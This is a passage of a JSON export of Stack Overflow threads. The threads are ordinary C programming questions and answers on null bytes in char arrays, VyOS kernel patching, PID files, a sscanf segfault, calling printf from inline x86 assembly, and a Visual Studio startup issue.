am using the individual characters in the array to convey information (error ids and error codes) like this:</p>\n\n<pre><code>if (tmp[i] == 250])\n</code></pre>\n\n<p>Where <code>tmp</code> is a character array in form of char <code>tmp[500];</code> that is first initialized to <code>0</code> and then filled with input from the comport. </p>\n\n<p>My question is:</p>\n\n<p>Assuming I iterate through every piece of the array, is it safe to use <code>0</code> (as in <code>\\0</code>) at any point before the end of the Array? Assuming I am:</p>\n\n<ol>\n<li>Not treating it as a string (iterating through and using it like an <code>int</code> array)</li>\n<li>In knowledge of what is going to be in there and what exactly this random \\0 in the middle of it is supposed to mean.</li>\n</ol>\n\n<p>The reason im asking is because I had several coworkers tell me that I should never ever ever use a character array that contains <code>\\0</code> before the end, no matter the circumstances.</p>\n\n<p>My code doing this currently performs as expected, but im unsure if it might cause problems later.</p>\n\n<p>Rewriting it to avoid this behaviour would be a non-trivial chunk of work.       </p>\n"}, {"tags": ["c", "linux", "module", "kernel", "patch"], "answers": [{"tags": [], "owner": {"reputation": 579, "user_id": 4371177, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0deb2a7b0ef3f1264fab392cb1584f72?s=128&d=identicon&r=PG&f=1", "display_name": "Mazhar", "link": "https://stackoverflow.com/users/4371177/mazhar"}, "is_accepted": true, "score": 1, "last_activity_date": 1450249955, "last_edit_date": 1450249955, "creation_date": 1450199526, "answer_id": 34295356, "question_id": 33650598, "link": "https://stackoverflow.com/questions/33650598/how-to-write-a-patch-for-vyos-kernel/34295356#34295356", "title": "How to write a Patch for VyOS kernel", "body": "<p>After a long search I solved the problem I was facing. Here is conclusions in case any of you gets stuck in same problem.</p>\n\n<ol>\n<li><p>Yes, you can edit the kernel module code in VyOS Development. But this method is not much appreciated. </p></li>\n<li><p>Yes, you can write patch for kernel modules too. and it should be in GIT formate as described in <a href=\"http://vyos.net/wiki/Submit_a_patch\" rel=\"nofollow\">How to write VyOS Patch</a>. Soon I will update, where to place <code>.patch</code> file in VyOS kernel code.</p></li>\n</ol>\n\n<p>To check the debugging output using <code>dmesg</code>,  use <code>KERN_DEBUG</code> option. As I am not sure about others. </p>\n\n<p><code>printk(KERN_DEBUG \"%s: Debuging info \\n\",  __FUNCTION__);</code></p>\n\n<p>Moreover to check modification in VyOS kernel you don't need to make a complete ISO file all the time. You just need to run following commands. </p>\n\n<p>*Note each path is\ndescribed everytime from the main iso building directory to avoid path problems. </p>\n\n<pre><code>cd build-iso/\nsudo make clean-linux-image\nsudo make linux-image\n</code></pre>\n\n<p>Then </p>\n\n<pre><code>cd buil-iso/pkgs/\n</code></pre>\n\n<p>Here you will find these debian packages. </p>\n\n<pre><code>buil-iso/pkgs/linux-image-3.13.11-1-amd64-vyos_999.dev_amd64.deb\nbuil-iso/pkgs/linux-libc-dev_999.dev_amd64.deb\nbuil-iso/pkgs/linux-vyatta-kbuild_999.dev_amd64.deb\n</code></pre>\n\n<p>Copy these files to an already installed VyOS Sytem and install them over there.          </p>\n\n<pre><code>dpkg -i linux-image-3.13.11-1-amd64-vyos_999.dev_amd64.deb\ndpkg -i linux-libc-dev_999.dev_amd64.deb\ndpkg -i linux-vyatta-kbuild_999.dev_amd64.deb\n</code></pre>\n\n<p><code>reboot</code> the system and check you modifications using <code>dmesg</code>.</p>\n"}], "owner": {"reputation": 579, "user_id": 4371177, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0deb2a7b0ef3f1264fab392cb1584f72?s=128&d=identicon&r=PG&f=1", "display_name": "Mazhar", "link": "https://stackoverflow.com/users/4371177/mazhar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 199, "favorite_count": 2, "accepted_answer_id": 34295356, "answer_count": 1, "score": 0, "last_activity_date": 1450249955, "creation_date": 1447245047, "last_edit_date": 1450189488, "question_id": 33650598, "link": "https://stackoverflow.com/questions/33650598/how-to-write-a-patch-for-vyos-kernel", "title": "How to write a Patch for VyOS kernel", "body": "<p>I am new to <code>VyOS development</code>. I have written a code, which will fetch info from <code>VyOS kernel module</code> and write it on a <code>netlink socket</code>.But the problem is I am not sure whether </p>\n\n<ol>\n<li><p>Can I edit the kernel module code directly to call my defined function or I have to write the patch. </p></li>\n<li><p>If I have to make a patch file for it then where to place it in kernel source code. I have already made a patch file using <code>diff</code> command. </p></li>\n</ol>\n\n<p>I have searched a lot about this problem but couldn't find the satisfactory solution.</p>\n\n<p>Thanks.  </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 6199, "user_id": 2560053, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/64aacb2c26ae0bb85730da51291d0b9b?s=128&d=identicon&r=PG", "display_name": "Thomas Baruchel", "link": "https://stackoverflow.com/users/2560053/thomas-baruchel"}, "edited": false, "score": 0, "creation_date": 1447245021, "post_id": 33650533, "comment_id": 55074544, "body": "Are you sure the &quot;c&quot; tag is really relevant for this question?"}], "answers": [{"comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447316223, "post_id": 33650605, "comment_id": 55106929, "body": "if the file already exists, does the OP want to replace the contents or append the new PID."}, {"owner": {"reputation": 13, "user_id": 4905461, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vFMci.jpg?s=128&g=1", "display_name": "Cl&#225;opes", "link": "https://stackoverflow.com/users/4905461/cl%c3%a1opes"}, "edited": false, "score": 0, "creation_date": 1447347450, "post_id": 33650605, "comment_id": 55127000, "body": "append. Thanks Everyone."}], "tags": [], "owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "is_accepted": true, "score": 5, "last_activity_date": 1447245071, "creation_date": 1447245071, "answer_id": 33650605, "question_id": 33650533, "link": "https://stackoverflow.com/questions/33650533/creating-pid-file-that-stores-user-pid/33650605#33650605", "title": "Creating .pid file that stores user PID", "body": "<ol>\n<li>Get the PID using <code>getpid()</code>.</li>\n<li>Open the file using <code>fopen()</code>.</li>\n<li>Write the PID to the file by <code>fprintf()</code>.</li>\n<li>Close the file using <code>fclose()</code>.</li>\n</ol>\n"}], "owner": {"reputation": 13, "user_id": 4905461, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vFMci.jpg?s=128&g=1", "display_name": "Cl&#225;opes", "link": "https://stackoverflow.com/users/4905461/cl%c3%a1opes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 398, "favorite_count": 0, "accepted_answer_id": 33650605, "answer_count": 1, "score": 1, "last_activity_date": 1447245071, "creation_date": 1447244831, "question_id": 33650533, "link": "https://stackoverflow.com/questions/33650533/creating-pid-file-that-stores-user-pid", "title": "Creating .pid file that stores user PID", "body": "<p>First time publishing here<br>\nSimple situation: In PUTTY, i have to create a file named admin.pid where it stores a PID when the user starts the \"app\" i'm creating. How can i do this? Thanks</p>\n"}, {"tags": ["c", "segmentation-fault"], "comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1447246504, "post_id": 33650395, "comment_id": 55075278, "body": "If you have compiled with <code>gcc -Wall -Wextra -g</code> you would have gotten warnings, and you could have debugged yourself."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 1, "creation_date": 1447246683, "post_id": 33650395, "comment_id": 55075382, "body": "Who voted to close this? The question contains an error description and a minimal self-contained example, what else do you require?"}], "answers": [{"comments": [{"owner": {"reputation": 1438, "user_id": 5345612, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/80f66466ea864a27bc88dd3bf614f8c4?s=128&d=identicon&r=PG&f=1", "display_name": "HuangJie", "link": "https://stackoverflow.com/users/5345612/huangjie"}, "edited": false, "score": 0, "creation_date": 1447244636, "post_id": 33650459, "comment_id": 55074332, "body": "Thanks for your reply....I have corrected this problem, but the error remains...."}, {"owner": {"reputation": 1438, "user_id": 5345612, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/80f66466ea864a27bc88dd3bf614f8c4?s=128&d=identicon&r=PG&f=1", "display_name": "HuangJie", "link": "https://stackoverflow.com/users/5345612/huangjie"}, "edited": false, "score": 0, "creation_date": 1447244728, "post_id": 33650459, "comment_id": 55074385, "body": "I think the same goes for <code>ino</code>"}], "tags": [], "owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "is_accepted": true, "score": 3, "last_activity_date": 1447244781, "last_edit_date": 1447244781, "creation_date": 1447244548, "answer_id": 33650459, "question_id": 33650395, "link": "https://stackoverflow.com/questions/33650395/segmentation-fault-in-reading-proc-pid-maps/33650459#33650459", "title": "segmentation fault in reading /proc/pid/maps", "body": "<p>You need to pass pointers to the members of the <code>flags</code> array instead of passing them directly, the same applies to the <code>ino</code> argument:</p>\n\n<pre><code>sscanf(buf, \"%x-%x %c%c%c%c %x %x:%x %lu \", &amp;from, &amp;to,\n    &amp;flags[0], &amp;flags[1], &amp;flags[2], &amp;flags[3],\n    &amp;pgoff, &amp;major, &amp;minor, &amp;ino);\n</code></pre>\n\n<p>Alternatively, scan all characters at once:</p>\n\n<pre><code>sscanf(buf, \"%x-%x %4c %x %x:%x %lu \", &amp;from, &amp;to,\n    flags, &amp;pgoff, &amp;major, &amp;minor, &amp;ino);\n</code></pre>\n\n<p>Notice the missing <code>&amp;</code> before <code>flags</code> as the array is automatically converted into a pointer to its first element when passed to a function.</p>\n"}, {"tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": false, "score": 1, "last_activity_date": 1447244559, "creation_date": 1447244559, "answer_id": 33650463, "question_id": 33650395, "link": "https://stackoverflow.com/questions/33650395/segmentation-fault-in-reading-proc-pid-maps/33650463#33650463", "title": "segmentation fault in reading /proc/pid/maps", "body": "<p>In the scanf call replace </p>\n\n<pre><code>flags[x]\n</code></pre>\n\n<p>by</p>\n\n<pre><code>&amp;flags[x]\n</code></pre>\n\n<p>same goes for <code>ino</code>.</p>\n"}], "owner": {"reputation": 1438, "user_id": 5345612, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/80f66466ea864a27bc88dd3bf614f8c4?s=128&d=identicon&r=PG&f=1", "display_name": "HuangJie", "link": "https://stackoverflow.com/users/5345612/huangjie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 756, "favorite_count": 0, "accepted_answer_id": 33650459, "answer_count": 2, "score": 1, "last_activity_date": 1447244781, "creation_date": 1447244332, "question_id": 33650395, "link": "https://stackoverflow.com/questions/33650395/segmentation-fault-in-reading-proc-pid-maps", "title": "segmentation fault in reading /proc/pid/maps", "body": "<p>I'm trying to read <code>maps</code> line by line, but I get the error core <code>segmentation fault</code> error... Can anyone give me some advice on my code? I'm using <code>3.13.0-32-generic</code></p>\n\n<pre><code>int main()\n{\n    char buf[512];\n    FILE *f;\n    sprintf(buf, \"/proc/%d/maps\", getpid());\n    f = fopen(buf, \"rt\");\n    while (fgets(buf, 512, f)) {\n        unsigned int from, to, pgoff, major, minor;\n        unsigned long ino;\n        char flags[4];\n        int ret = sscanf(buf, \"%x-%x %c%c%c%c %x %x:%x %lu \", &amp;from, &amp;to, flags[0],flags[1],flags[2],flags[3], &amp;pgoff, &amp;major, &amp;minor,ino);\n            if (ret != 10)\n            break;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "assembly"], "comments": [{"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1447243739, "post_id": 33650174, "comment_id": 55073877, "body": "Yes, but (as I assume you know), not with that code."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 2, "creation_date": 1447243766, "post_id": 33650174, "comment_id": 55073892, "body": "It&#39;s possible, but you need to push a pointer to the format string, not the format string itself."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1447244018, "post_id": 33650174, "comment_id": 55074014, "body": "The C standard has no idea about &quot;segments&quot; or &quot;sections&quot;. And you cannot just  <i>declare</i> a variable, but also have to <i>define</i> it."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 3, "creation_date": 1447244937, "post_id": 33650174, "comment_id": 55074491, "body": "How do you figure <code>3710092110</code> has <i>anything</i> to do with <code>%d\\n</code>?"}, {"owner": {"reputation": 7481, "user_id": 2527795, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/8359590ce3a66e5c58407ae5c83c9bbe?s=128&d=identicon&r=PG&f=1", "display_name": "vll", "link": "https://stackoverflow.com/users/2527795/vll"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1447245228, "post_id": 33650174, "comment_id": 55074630, "body": "@EOF I didn&#39;t test it, but I figure 3710092110 is what you get when you convert contents of 4 byte char array &quot;%d\\n&quot; to a 4 byte integer."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "reply_to_user": {"reputation": 7481, "user_id": 2527795, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/8359590ce3a66e5c58407ae5c83c9bbe?s=128&d=identicon&r=PG&f=1", "display_name": "vll", "link": "https://stackoverflow.com/users/2527795/vll"}, "edited": false, "score": 1, "creation_date": 1447245434, "post_id": 33650174, "comment_id": 55074741, "body": "@Ville-ValtteriTiittanen: Well, maybe you <i>should</i> test it before talking to me."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1447245776, "post_id": 33650174, "comment_id": 55074917, "body": "@Mamma: And if you think <code>%d\\n</code> is equal to the bytes <code>37</code>, <code>100</code>, <code>92</code> and <code>110</code>, you need to learn about both escape codes <i>and</i> null-termination."}, {"owner": {"reputation": 283, "user_id": 5460111, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d0a2ddb99980c0a6ca3124ca63d52121?s=128&d=identicon&r=PG&f=1", "display_name": "Mamma", "link": "https://stackoverflow.com/users/5460111/mamma"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1447245942, "post_id": 33650174, "comment_id": 55075010, "body": "@EOF you are correct as well, i used a bloody string to ascii converter and didn&#39;t think it would convert \\n to the ascii code of \\ and n and ofc i forgot the null terminator as well. thank you mate"}], "answers": [{"tags": [], "owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "is_accepted": false, "score": 3, "last_activity_date": 1447243853, "creation_date": 1447243853, "answer_id": 33650258, "question_id": 33650174, "link": "https://stackoverflow.com/questions/33650174/assembly-x86-calling-c-functions/33650258#33650258", "title": "Assembly x86 - Calling C functions", "body": "<p>The format string is passed by pushing its <em>address</em> on the stack.  So you could put the string wherever you like, but still need to pass its address.</p>\n"}, {"tags": [], "owner": {"reputation": 19872, "user_id": 3144770, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/hN6jT.png?s=128&g=1", "display_name": "Sep Roland", "link": "https://stackoverflow.com/users/3144770/sep-roland"}, "is_accepted": true, "score": 3, "last_activity_date": 1447255800, "creation_date": 1447255800, "answer_id": 33653953, "question_id": 33650174, "link": "https://stackoverflow.com/questions/33650174/assembly-x86-calling-c-functions/33653953#33653953", "title": "Assembly x86 - Calling C functions", "body": "<p>Your second code snippet comes close but it still needs to use a different value for the contents of the format string <strong>%d\\n</strong>. </p>\n\n<p>The characters involved translate to <strong>%</strong>=37, <strong>d</strong>=100, <strong>\\n</strong>=10 in decimal.<br>\nBut it is far easier to work with hexadecimal: <strong>%</strong>=25h, <strong>d</strong>=64h, <strong>\\n</strong>=0Ah\nDue to little endeanness we have to put the first character in the lowest byte of the dword to push on the stack. We leave the highest byte zero to have the necesary null termination.</p>\n\n<pre><code>%d\\n  --&gt;  000A6425h\n</code></pre>\n\n<p>Your code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    __asm\n    {\n        push 000A6425h ;= format in ascii for %d\\n\n        push 1; argument to print\n        lea edx, dword ptr[esp + 4]; get address of the format on stack\n        push edx ; push the address of the format\n        call printf\n        add esp, 12\n    }\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 283, "user_id": 5460111, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d0a2ddb99980c0a6ca3124ca63d52121?s=128&d=identicon&r=PG&f=1", "display_name": "Mamma", "link": "https://stackoverflow.com/users/5460111/mamma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 0, "accepted_answer_id": 33653953, "answer_count": 2, "score": 2, "last_activity_date": 1447255800, "creation_date": 1447243483, "last_edit_date": 1447245038, "question_id": 33650174, "link": "https://stackoverflow.com/questions/33650174/assembly-x86-calling-c-functions", "title": "Assembly x86 - Calling C functions", "body": "<p>I was wondering if it is possible to call printf for example without declaring the format array in the data segment. This question is regarding x86.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    __asm\n    {\n        push 1 ; number to print\n        push 3710092110 ; format in ascii for %d\\n\n        call printf\n        add esp, 8\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Ok so we need to push the address of the format instead of the format itself so something like this should be close enough right?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    __asm\n    {\n        push 3710092110 ; 3710092110 = format in ascii for %d\\n\n        push 1; argument to print\n        lea edx, dword ptr[esp + 4]; get address of the format on stack\n        push edx ; push the address of the format\n        call printf\n        add esp, 12\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Do you guys happen to have the time to demonstrate a working example? Can't find anything on the internet about it.</p>\n"}, {"tags": ["javascript", "c++", "c"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1447242214, "post_id": 33649785, "comment_id": 55073072, "body": "There is no language C/C++. This is not C, so do not add C tag!"}, {"owner": {"reputation": 3194, "user_id": 3296661, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/41ff503748956543e82feb879cada522?s=128&d=identicon&r=PG&f=1", "display_name": "YaBCK", "link": "https://stackoverflow.com/users/3296661/yabck"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1447242459, "post_id": 33649785, "comment_id": 55073206, "body": "@Olaf Sorry I didn&#39;t make it clear enough the C/C++ was to say either C or C++. I added the C tag because I don&#39;t mind if anyone could give an answer in C"}], "owner": {"reputation": 3194, "user_id": 3296661, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/41ff503748956543e82feb879cada522?s=128&d=identicon&r=PG&f=1", "display_name": "YaBCK", "link": "https://stackoverflow.com/users/3296661/yabck"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 47, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1447242892, "creation_date": 1447242042, "last_edit_date": 1447242892, "question_id": 33649785, "link": "https://stackoverflow.com/questions/33649785/capture-javascript-events-in-c-or-c-windows-application", "title": "Capture JavaScript events in C or C++ Windows Application", "body": "<p>I'm currently using IWebBrowser2 C++ which I've managed to call JavaScript functions from the native client side.</p>\n\n<p>Which I use the following to do:</p>\n\n<pre><code>void CallWebPage::OnDocumentComplete(LPCTSTR strURL,LPDISPATCH pDisp)\n{\n    m_bDocumentComplete = true;\n    m_webPage.SetDocument(pDisp);\n    UpdateAllViews(NULL,HINT_ON_DOCUMENT_COMPLETE);\n\n    // Call FunctionTest function on JavaScript side\n    m_webPage.CallJavaScriptFunction(\"FunctionTest\");\n}\n</code></pre>\n\n<p>However I'm looking for a way of picking up JavaScript events inside my application. </p>\n\n<p>for example:</p>\n\n<p>If I was to type inside a input field on the JavaScript side, I would be able to pick that up inside my windows application and print out what was typed inside that input field.</p>\n\n<p>So I would like some guidence on how I would go about doing this and to know if it's possible to do this?</p>\n\n<p><strong>If there is a way of doing it in C or C++ then that would be great.</strong></p>\n"}, {"tags": ["c#", "c", "visual-studio", "wix", ".net-4.6"], "comments": [{"owner": {"reputation": 25213, "user_id": 3651607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mnc14.png?s=128&g=1", "display_name": "Andy Korneyev", "link": "https://stackoverflow.com/users/3651607/andy-korneyev"}, "edited": false, "score": 2, "creation_date": 1447242172, "post_id": 33649772, "comment_id": 55073042, "body": "Check if one of your solution projects marked as startup project (it has boll name in solution explorer). If none is marked, do it via context menu on right mousebutton click."}, {"owner": {"reputation": 435, "user_id": 3279193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/41e04541811bb4d56301432ac371dde1?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/3279193/chris"}, "reply_to_user": {"reputation": 25213, "user_id": 3651607, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mnc14.png?s=128&g=1", "display_name": "Andy Korneyev", "link": "https://stackoverflow.com/users/3651607/andy-korneyev"}, "edited": false, "score": 0, "creation_date": 1447242238, "post_id": 33649772, "comment_id": 55073085, "body": "I have checked that, I do have a project marked and it is the correct project! @AndyKorneyev"}, {"owner": {"reputation": 5521, "user_id": 4546874, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/4800Y.png?s=128&g=1", "display_name": "F\u1d00\u0280\u029c\u1d00\u0274 A\u0274\u1d00\u1d0d", "link": "https://stackoverflow.com/users/4546874/f%e1%b4%80%ca%80%ca%9c%e1%b4%80%c9%b4-a%c9%b4%e1%b4%80%e1%b4%8d"}, "edited": false, "score": 1, "creation_date": 1447242273, "post_id": 33649772, "comment_id": 55073105, "body": "in the project properties, there must be some startup object thing. check that it is set to something correct."}, {"owner": {"reputation": 435, "user_id": 3279193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/41e04541811bb4d56301432ac371dde1?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/3279193/chris"}, "reply_to_user": {"reputation": 5521, "user_id": 4546874, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/4800Y.png?s=128&g=1", "display_name": "F\u1d00\u0280\u029c\u1d00\u0274 A\u0274\u1d00\u1d0d", "link": "https://stackoverflow.com/users/4546874/f%e1%b4%80%ca%80%ca%9c%e1%b4%80%c9%b4-a%c9%b4%e1%b4%80%e1%b4%8d"}, "edited": false, "score": 0, "creation_date": 1447242424, "post_id": 33649772, "comment_id": 55073193, "body": "The properties for the start up project are identical to that of the same project in VS2013 @FarhanAnam"}, {"owner": {"reputation": 435, "user_id": 3279193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/41e04541811bb4d56301432ac371dde1?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/3279193/chris"}, "edited": false, "score": 0, "creation_date": 1447242470, "post_id": 33649772, "comment_id": 55073216, "body": "Just thought of something, is it possible it is not running because I have both VS2013 and VS2015 open?"}, {"owner": {"reputation": 5521, "user_id": 4546874, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/4800Y.png?s=128&g=1", "display_name": "F\u1d00\u0280\u029c\u1d00\u0274 A\u0274\u1d00\u1d0d", "link": "https://stackoverflow.com/users/4546874/f%e1%b4%80%ca%80%ca%9c%e1%b4%80%c9%b4-a%c9%b4%e1%b4%80%e1%b4%8d"}, "edited": false, "score": 1, "creation_date": 1447242492, "post_id": 33649772, "comment_id": 55073231, "body": "no that should not be the cause."}, {"owner": {"reputation": 435, "user_id": 3279193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/41e04541811bb4d56301432ac371dde1?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/3279193/chris"}, "reply_to_user": {"reputation": 5521, "user_id": 4546874, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/4800Y.png?s=128&g=1", "display_name": "F\u1d00\u0280\u029c\u1d00\u0274 A\u0274\u1d00\u1d0d", "link": "https://stackoverflow.com/users/4546874/f%e1%b4%80%ca%80%ca%9c%e1%b4%80%c9%b4-a%c9%b4%e1%b4%80%e1%b4%8d"}, "edited": false, "score": 0, "creation_date": 1447242590, "post_id": 33649772, "comment_id": 55073282, "body": "@FarhanAnam believe it or not, I just closed VS2013 and then my project loaded! Not sure what that means the cause is."}, {"owner": {"reputation": 3498, "user_id": 1022339, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/7dab8efb5172d3be2ab47c6b2531a543?s=128&d=identicon&r=PG", "display_name": "Juan", "link": "https://stackoverflow.com/users/1022339/juan"}, "edited": false, "score": 1, "creation_date": 1447242624, "post_id": 33649772, "comment_id": 55073309, "body": "Does it run if you click the start &quot;green play button&quot;? Maybe your keyboard mappings have changed are they are no longer associated to F5. Also do you see something on the output window?"}, {"owner": {"reputation": 5521, "user_id": 4546874, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/4800Y.png?s=128&g=1", "display_name": "F\u1d00\u0280\u029c\u1d00\u0274 A\u0274\u1d00\u1d0d", "link": "https://stackoverflow.com/users/4546874/f%e1%b4%80%ca%80%ca%9c%e1%b4%80%c9%b4-a%c9%b4%e1%b4%80%e1%b4%8d"}, "edited": false, "score": 1, "creation_date": 1447242626, "post_id": 33649772, "comment_id": 55073311, "body": "start it again and try openning the project.]"}, {"owner": {"reputation": 435, "user_id": 3279193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/41e04541811bb4d56301432ac371dde1?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/3279193/chris"}, "reply_to_user": {"reputation": 3498, "user_id": 1022339, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/7dab8efb5172d3be2ab47c6b2531a543?s=128&d=identicon&r=PG", "display_name": "Juan", "link": "https://stackoverflow.com/users/1022339/juan"}, "edited": false, "score": 0, "creation_date": 1447242723, "post_id": 33649772, "comment_id": 55073366, "body": "@Juan Yes I did try that and it didn&#39;t run either"}, {"owner": {"reputation": 5521, "user_id": 4546874, "user_type": "registered", "accept_rate": 75, "profile_image": 